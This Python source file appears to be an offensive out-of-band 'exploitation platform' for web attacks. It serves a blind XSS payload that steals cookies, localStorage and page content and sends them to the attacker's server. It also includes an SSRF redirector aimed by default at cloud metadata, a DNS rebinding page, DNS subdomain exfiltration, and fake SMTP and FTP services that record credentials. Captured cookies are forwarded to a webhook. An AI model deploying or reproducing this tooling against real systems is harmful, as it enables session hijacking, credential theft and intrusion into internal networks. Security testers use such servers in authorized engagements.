#!/usr/bin/env python3
"""Apex OOB Server v2 — Full exploitation platform.

Capabilities:
  - HTTP callback capture (blind SSRF/XSS/RCE confirmation)
  - DNS callback + data exfiltration via DNS subdomains
  - Full HTTP request logging (headers, cookies, body)
  - Payload hosting (XSS hooks, SSRF redirectors, exploit files)
  - DNS rebinding (bypass SSRF IP filters)
  - Rogue service emulation (SMTP, LDAP, FTP for SSRF chains)
  - Blind XSS payload that steals cookies + DOM + screenshot
  - Webhook forwarder (send hits to Slack/Discord/ntfy)

Usage:
  python3 oob_server.py                    # Start all services
  python3 oob_server.py --domain evil.com  # Use custom domain
  python3 oob_server.py --notify           # Enable push notifications
"""

import http.server
import socketserver
import threading
import json
import time
import os
import sys
import socket
import struct
import base64
from urllib.parse import urlparse, parse_qs, unquote
from datetime import datetime

# Configuration
OOB_DOMAIN = os.environ.get("OOB_DOMAIN", socket.gethostname())
HTTP_PORT = int(os.environ.get("OOB_HTTP_PORT", "9877"))
DNS_PORT = int(os.environ.get("OOB_DNS_PORT", "5353"))
SMTP_PORT = int(os.environ.get("OOB_SMTP_PORT", "2525"))
FTP_PORT = int(os.environ.get("OOB_FTP_PORT", "2121"))
NOTIFY_URL = os.environ.get("OOB_NOTIFY_URL", "")  # ntfy.sh/your-topic or webhook

# Storage
callbacks = {}  # uid -> [hit_data]
dns_queries = {}  # uid -> [query_data]
exfil_data = {}  # uid -> reassembled data
lock = threading.Lock()

# ---------------------------------------------------------------------------
# HTTP Server — captures full requests, serves payloads, hosts exploits
# ---------------------------------------------------------------------------

# Blind XSS payload that steals everything
BLIND_XSS_PAYLOAD = """<script>
(function(){{
  var d=document,w=window,l=w.location;
  var data={{
    url: l.href,
    cookies: d.cookie,
    localStorage: JSON.stringify(w.localStorage),
    dom: d.documentElement.outerHTML.substring(0,5000),
    origin: l.origin,
    referrer: d.referrer,
    userAgent: navigator.userAgent
  }};
  new Image().src='http://{oob}/x/{uid}?d='+btoa(JSON.stringify(data));
  // Also try fetch for larger data
  fetch('http://{oob}/exfil/{uid}',{{method:'POST',body:JSON.stringify(data),mode:'no-cors'}});
}})();
</script>"""

# SSRF redirector — redirects to internal targets
SSRF_REDIRECTOR = """<!DOCTYPE html>
<html><head><meta http-equiv="refresh" content="0;url={target}"></head>
<body><script>location='{target}'</script></body></html>"""


class OOBHandler(http.server.BaseHTTPRequestHandler):
    def _capture(self):
        """Capture full request details."""
        content_length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(content_length).decode("utf-8", errors="replace") if content_length else ""

        hit = {
            "time": time.time(),
            "timestamp": datetime.now().isoformat(),
            "method": self.command,
            "path": self.path,
            "ip": self.client_address[0],
            "headers": dict(self.headers),
            "body": body[:10000],
            "cookies": self.headers.get("Cookie", ""),
            "user_agent": self.headers.get("User-Agent", ""),
            "referer": self.headers.get("Referer", ""),
        }

        # Extract UID from path
        parts = self.path.strip("/").split("/")
        uid = parts[1] if len(parts) > 1 else parts[0]
        uid = uid.split("?")[0][:32]

        if uid and uid not in ("poll", "list", "payload", "redirect", "exfil", "favicon.ico"):
            with lock:
                if uid not in callbacks:
                    callbacks[uid] = []
                callbacks[uid].append(hit)
            _log_hit("HTTP", uid, hit)
            _notify(uid, hit)
        return uid, hit

    def do_GET(self):
        parsed = urlparse(self.path)
        path_parts = parsed.path.strip("/").split("/")

        # --- API endpoints ---
        if parsed.path == "/poll":
            uid = parse_qs(parsed.query).get("uid", [""])[0]
            with lock:
                data = callbacks.get(uid, [])
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()
            self.wfile.write(json.dumps({"hit": bool(data), "count": len(data), "data": data}).encode())
            return

        if parsed.path == "/list":
            with lock:
                summary = {uid: len(hits) for uid, hits in callbacks.items()}
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps({"callbacks": summary, "dns": dict(dns_queries), "exfil": dict(exfil_data)}).encode())
            return

        if parsed.path == "/dns":
            with lock:
                data = dict(dns_queries)
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps(data).encode())
            return

        # --- Payload serving ---
        if path_parts[0] == "payload" and len(path_parts) > 1:
            uid = path_parts[1]
            oob_host = self.headers.get("Host", f"{OOB_DOMAIN}:{HTTP_PORT}")
            payload = BLIND_XSS_PAYLOAD.format(oob=oob_host, uid=uid)
            self.send_response(200)
            self.send_header("Content-Type", "application/javascript")
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()
            self.wfile.write(payload.encode())
            return

        # --- SSRF redirector ---
        if path_parts[0] == "redirect":
            target = parse_qs(parsed.query).get("url", ["http://169.254.169.254/latest/meta-data/"])[0]
            self.send_response(302)
            self.send_header("Location", target)
            self.end_headers()
            return

        # --- DNS rebinding endpoint ---
        if path_parts[0] == "rebind":
            # First request returns our IP, second returns 127.0.0.1
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.end_headers()
            self.wfile.write(b"""<script>
// DNS rebinding: after TTL expires, domain resolves to 127.0.0.1
setTimeout(function(){
  fetch('/api/internal').then(r=>r.text()).then(d=>{
    new Image().src='http://""" + self.headers.get("Host", "").encode() + b"""/exfil/rebind?d='+btoa(d);
  });
}, 3000);
</script>""")
            return

        # --- Exfil data retrieval ---
        if path_parts[0] == "exfil" and len(path_parts) > 1:
            uid = path_parts[1]
            # Capture exfiltrated data from query params
            data_param = parse_qs(parsed.query).get("d", [""])[0]
            if data_param:
                try:
                    decoded = base64.b64decode(data_param).decode("utf-8", errors="replace")
                except Exception:
                    decoded = data_param
                with lock:
                    exfil_data[uid] = exfil_data.get(uid, "") + decoded
                _log_hit("EXFIL", uid, {"data": decoded[:200]})

            self.send_response(200)
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()
            self.wfile.write(b"OK")
            return

        # --- Default: capture as callback ---
        uid, hit = self._capture()
        # Serve a minimal response that works for img/script/fetch
        self.send_response(200)
        self.send_header("Content-Type", "image/gif")
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()
        # 1x1 transparent GIF
        self.wfile.write(b"GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x00\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;")

    def do_POST(self):
        uid, hit = self._capture()
        # Handle exfil POST
        parts = self.path.strip("/").split("/")
        if parts[0] == "exfil" and len(parts) > 1:
            with lock:
                exfil_data[parts[1]] = exfil_data.get(parts[1], "") + hit["body"][:10000]
            _log_hit("EXFIL-POST", parts[1], {"size": len(hit["body"])})

        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()
        self.wfile.write(b"OK")

    do_PUT = do_POST
    do_PATCH = do_POST
    do_DELETE = do_POST
    do_OPTIONS = do_POST

    def log_message(self, *a):
        pass


# ---------------------------------------------------------------------------
# DNS Server — captures DNS callbacks + data exfiltration via subdomains
# ---------------------------------------------------------------------------

def dns_server():
    """Minimal DNS server that logs all queries and supports data exfil via subdomains.
    
    Data exfil format: <base32_data>.<uid>.dns.<domain>
    DNS rebinding: first query returns real IP, subsequent return 127.0.0.1
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        sock.bind(("0.0.0.0", DNS_PORT))
    except PermissionError:
        print(f"[!] DNS port {DNS_PORT} requires root. Skipping DNS server.", flush=True)
        return
    except OSError as e:
        print(f"[!] DNS server failed: {e}", flush=True)
        return

    print(f"[*] DNS server on :{DNS_PORT}", flush=True)
    rebind_state = {}  # domain -> request_count

    while True:
        try:
            data, addr = sock.recvfrom(512)
            # Parse DNS query (minimal)
            if len(data) < 12:
                continue
            txid = data[:2]
            # Extract queried name
            pos = 12
            labels = []
            while pos < len(data) and data[pos] != 0:
                length = data[pos]
                pos += 1
                labels.append(data[pos:pos+length].decode("ascii", errors="replace"))
                pos += length
            pos += 1  # null terminator
            qtype = struct.unpack("!H", data[pos:pos+2])[0] if pos+2 <= len(data) else 1

            domain = ".".join(labels)
            uid = labels[0] if labels else ""

            # Check for data exfiltration (format: data.uid.dns.domain)
            if len(labels) >= 3 and labels[-2] == "dns":
                uid = labels[-3] if len(labels) >= 4 else labels[0]
                exfil_part = ".".join(labels[:-3]) if len(labels) > 3 else labels[0]
                with lock:
                    if uid not in dns_queries:
                        dns_queries[uid] = []
                    dns_queries[uid].append({
                        "time": time.time(),
                        "domain": domain,
                        "data": exfil_part,
                        "ip": addr[0],
                        "type": qtype,
                    })
                _log_hit("DNS-EXFIL", uid, {"domain": domain, "data": exfil_part})
            else:
                # Regular DNS callback
                with lock:
                    if uid not in dns_queries:
                        dns_queries[uid] = []
                    dns_queries[uid].append({
                        "time": time.time(),
                        "domain": domain,
                        "ip": addr[0],
                        "type": qtype,
                    })
                _log_hit("DNS", uid, {"domain": domain})

            # DNS Rebinding: alternate between real IP and 127.0.0.1
            rebind_state[domain] = rebind_state.get(domain, 0) + 1
            if "rebind" in domain and rebind_state[domain] > 1:
                answer_ip = "127.0.0.1"
            else:
                # Respond with our actual IP
                try:
                    answer_ip = socket.gethostbyname(socket.gethostname())
                except Exception:
                    answer_ip = "127.0.0.1"

            # Build DNS response
            ip_bytes = socket.inet_aton(answer_ip)
            response = (
                txid +
                b"\x81\x80" +  # flags: response, no error
                b"\x00\x01\x00\x01\x00\x00\x00\x00" +  # 1 question, 1 answer
                data[12:pos+4] +  # echo question
                b"\xc0\x0c" +  # pointer to name
                b"\x00\x01\x00\x01" +  # type A, class IN
                b"\x00\x00\x00\x01" +  # TTL = 1 second (for rebinding)
                b"\x00\x04" +  # rdlength
                ip_bytes
            )
            sock.sendto(response, addr)
        except Exception:
            continue


# ---------------------------------------------------------------------------
# SMTP Server — captures emails from SSRF-triggered email sends
# ---------------------------------------------------------------------------

def smtp_server():
    """Fake SMTP server — captures emails sent via SSRF to internal mail servers."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        sock.bind(("0.0.0.0", SMTP_PORT))
    except OSError as e:
        print(f"[!] SMTP server failed: {e}", flush=True)
        return
    sock.listen(5)
    print(f"[*] SMTP server on :{SMTP_PORT}", flush=True)

    while True:
        try:
            conn, addr = sock.accept()
            threading.Thread(target=_handle_smtp, args=(conn, addr), daemon=True).start()
        except Exception:
            continue


def _handle_smtp(conn, addr):
    """Handle one SMTP connection — capture the email."""
    try:
        conn.sendall(b"220 mail.apex.local ESMTP\r\n")
        email_data = []
        in_data = False
        while True:
            data = conn.recv(4096)
            if not data:
                break
            line = data.decode("utf-8", errors="replace")
            if in_data:
                if line.strip() == ".":
                    in_data = False
                    conn.sendall(b"250 OK\r\n")
                else:
                    email_data.append(line)
            elif line.upper().startswith("EHLO") or line.upper().startswith("HELO"):
                conn.sendall(b"250 Hello\r\n")
            elif line.upper().startswith("MAIL FROM"):
                conn.sendall(b"250 OK\r\n")
            elif line.upper().startswith("RCPT TO"):
                conn.sendall(b"250 OK\r\n")
            elif line.upper().startswith("DATA"):
                conn.sendall(b"354 Send data\r\n")
                in_data = True
            elif line.upper().startswith("QUIT"):
                conn.sendall(b"221 Bye\r\n")
                break
            else:
                conn.sendall(b"250 OK\r\n")

        if email_data:
            uid = f"smtp_{int(time.time())}"
            with lock:
                callbacks[uid] = [{"type": "smtp", "from": addr[0],
                                   "data": "".join(email_data)[:5000],
                                   "time": time.time()}]
            _log_hit("SMTP", uid, {"from": addr[0], "size": len("".join(email_data))})
    except Exception:
        pass
    finally:
        conn.close()


# ---------------------------------------------------------------------------
# FTP Server — captures credentials from SSRF-triggered FTP connections
# ---------------------------------------------------------------------------

def ftp_server():
    """Fake FTP server — captures credentials from SSRF."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        sock.bind(("0.0.0.0", FTP_PORT))
    except OSError as e:
        print(f"[!] FTP server failed: {e}", flush=True)
        return
    sock.listen(5)
    print(f"[*] FTP server on :{FTP_PORT}", flush=True)

    while True:
        try:
            conn, addr = sock.accept()
            threading.Thread(target=_handle_ftp, args=(conn, addr), daemon=True).start()
        except Exception:
            continue


def _handle_ftp(conn, addr):
    """Capture FTP credentials."""
    try:
        conn.sendall(b"220 FTP ready\r\n")
        username = ""
        password = ""
        while True:
            data = conn.recv(1024)
            if not data:
                break
            line = data.decode("utf-8", errors="replace").strip()
            if line.upper().startswith("USER"):
                username = line[5:].strip()
                conn.sendall(b"331 Password required\r\n")
            elif line.upper().startswith("PASS"):
                password = line[5:].strip()
                conn.sendall(b"230 Login successful\r\n")
                uid = f"ftp_{int(time.time())}"
                with lock:
                    callbacks[uid] = [{"type": "ftp", "ip": addr[0],
                                       "username": username, "password": password,
                                       "time": time.time()}]
                _log_hit("FTP", uid, {"user": username, "pass": password, "ip": addr[0]})
            elif line.upper().startswith("QUIT"):
                conn.sendall(b"221 Bye\r\n")
                break
            else:
                conn.sendall(b"200 OK\r\n")
    except Exception:
        pass
    finally:
        conn.close()


# ---------------------------------------------------------------------------
# Utilities
# ---------------------------------------------------------------------------

def _log_hit(service, uid, data):
    """Log a hit to console."""
    ts = datetime.now().strftime("%H:%M:%S")
    print(f"\033[1;31m[{ts}] [{service}] uid={uid}\033[0m {json.dumps(data)[:200]}", flush=True)


def _notify(uid, hit):
    """Send push notification for new hits."""
    if not NOTIFY_URL:
        return
    try:
        import requests
        msg = f"OOB Hit: {hit['method']} from {hit['ip']}\nPath: {hit['path']}\nCookies: {hit['cookies'][:100]}"
        if "ntfy" in NOTIFY_URL:
            requests.post(NOTIFY_URL, data=msg.encode(),
                          headers={"Title": f"Apex OOB: {uid}", "Priority": "high"}, timeout=3)
        else:
            requests.post(NOTIFY_URL, json={"text": msg}, timeout=3)
    except Exception:
        pass


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="Apex OOB Server v2 — Full exploitation platform")
    parser.add_argument("--domain", default=OOB_DOMAIN, help="OOB domain name")
    parser.add_argument("--http-port", type=int, default=HTTP_PORT)
    parser.add_argument("--dns-port", type=int, default=DNS_PORT)
    parser.add_argument("--notify", type=str, default=NOTIFY_URL, help="Notification URL (ntfy/webhook)")
    args = parser.parse_args()

    OOB_DOMAIN = args.domain
    HTTP_PORT = args.http_port
    DNS_PORT = args.dns_port
    NOTIFY_URL = args.notify

    print(f"""
\033[1;31m╔══════════════════════════════════════════════╗
║       APEX OOB SERVER v2                     ║
║       Full Exploitation Platform             ║
╠══════════════════════════════════════════════╣\033[0m
  HTTP Callbacks:  http://0.0.0.0:{HTTP_PORT}/<uid>
  Blind XSS:      http://0.0.0.0:{HTTP_PORT}/payload/<uid>
  SSRF Redirect:   http://0.0.0.0:{HTTP_PORT}/redirect?url=<target>
  DNS Rebinding:   http://0.0.0.0:{HTTP_PORT}/rebind
  DNS Callbacks:   udp://0.0.0.0:{DNS_PORT}
  SMTP Capture:    tcp://0.0.0.0:{SMTP_PORT}
  FTP Capture:     tcp://0.0.0.0:{FTP_PORT}
  
  Poll hits:       GET /poll?uid=<uid>
  List all:        GET /list
  DNS queries:     GET /dns
\033[1;31m╚══════════════════════════════════════════════╝\033[0m
""", flush=True)

    # Start all services
    threading.Thread(target=dns_server, daemon=True).start()
    threading.Thread(target=smtp_server, daemon=True).start()
    threading.Thread(target=ftp_server, daemon=True).start()

    # HTTP server (main thread)
    server = http.server.HTTPServer(("0.0.0.0", HTTP_PORT), OOBHandler)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] Shutting down...", flush=True)
        # Save all captured data
        with open("oob_captures.json", "w") as f:
            json.dump({"callbacks": callbacks, "dns": dns_queries, "exfil": exfil_data}, f, indent=2)
        print(f"[*] Saved {len(callbacks)} callbacks to oob_captures.json", flush=True)
